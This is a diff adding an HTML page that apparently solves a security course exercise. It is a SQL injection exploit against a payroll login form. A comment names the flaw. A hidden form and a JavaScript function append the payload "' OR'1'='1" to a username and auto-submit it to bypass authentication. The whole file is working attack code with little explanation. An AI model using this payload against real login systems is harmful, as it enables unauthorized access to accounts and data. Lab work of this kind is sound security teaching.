@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<!-- The vulneralbility is that the input is not verified and "'" is allowed so that extra SQL statement can be injected. -->
+<body>
+<form action="http://payroll.gatech.edu/index.php" method="POST" id="sqlinjection">
+<input id="action" type="hidden" name="action" value="login"/>
+<input id="login" type="hidden" name="login" value=""/>
+<input id="pw" type="hidden" name="pw" value=""/>
+<input id="secret" type="hidden" name="secret" value="whatdoido?"/>
+</form>
+<input name="login" id="targetlogin" value="username">
+<button id="exploit" onclick="attack();">Submit</button>
+<script>
+function attack()
+{
+var statement = document.getElementById("targetlogin").value;
+statement +="' OR'1'='1";
+var pw = 'password';
+document.getElementById("login").value = statement;
+document.getElementById("pw").value = pw;
+document.getElementById("sqlinjection").submit();
+}
+</script>
+</body>
+</html>
